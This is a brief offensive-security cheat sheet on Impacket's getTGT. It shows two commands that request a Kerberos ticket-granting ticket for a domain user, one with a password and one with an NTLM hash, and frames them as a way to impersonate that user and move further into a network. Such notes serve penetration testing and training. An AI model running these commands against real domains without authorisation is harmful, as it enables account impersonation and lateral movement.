# Impacket-getTGT

## Use this impacket module to obtain a TGT of a user to impersonate him so that you can gain further access within a network.

#### 1) 

    impacket-getTGT DOMAIN.COM/USERNAME:PASSWORD -dc-ip DC_IP

(Request a TGT using valid credentials)

#### 2) 

    impacket-getTGT DOMAIN.COM/USERNAME -hashes NTLM_HASH -dc-ip DC_IP

(Request a TGT using an NTLM hash)

### The ticket is saved as a .ccache file.
